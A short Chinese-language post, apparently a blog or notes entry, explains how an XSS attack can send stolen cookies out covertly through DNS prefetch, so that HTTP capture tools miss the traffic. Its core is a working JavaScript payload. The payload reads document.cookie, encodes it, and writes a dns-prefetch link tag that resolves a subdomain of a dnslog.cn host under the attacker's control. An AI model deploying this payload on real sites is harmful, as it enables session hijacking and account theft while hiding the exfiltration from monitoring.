目前xss传输cookie，一般有两个方式。



一、直接发送ajax请求，到后端程序处理。



二、新建一个img标签，然后把cookie拼接到img的src中。



但是这样在谷歌浏览器下F12，都无可避免的会产生一个网络请求。

那么在浏览器中有没有更隐蔽的数据传输通道，有的！



就是通过dns进行传输，这样不会被HTTP的抓包工具抓到。

但是使用JavaScript是无法直接操作DNS的。



现代化的谷歌浏览器中引入了一个新的标签，用来预加载DNS记录。


```js
<link rel="dns-prefetch" href="//hm.baidu.com">
```


当你浏览网页时，浏览器会加载网页时对网页中的域名进行解析缓存，这样在你单击当前网页链接无需DNS解析，减少浏览者等待时间，提高用户体验。



谷歌的本意是用来优化网页的打开速度，但是同样也可以用来进行少量数据的传输。

```js
        <script>
            cookie = document.cookie;
            cookie=cookie.replace(/=/g,'c1')
            cookie=cookie.replace('/;\s/g','c2')
            // console.log(cookie)
            document.writeln("<link rel=\'dns-prefetch\' href=\'//"+cookie+".xxxxxx.dnslog.cn\'>");
        </script>
```

## Ref
- [浏览器中隐蔽数据传输通道-DNS隧道](https://mp.weixin.qq.com/s/u5HV7umrZABcgVpZ5pn6WQ)
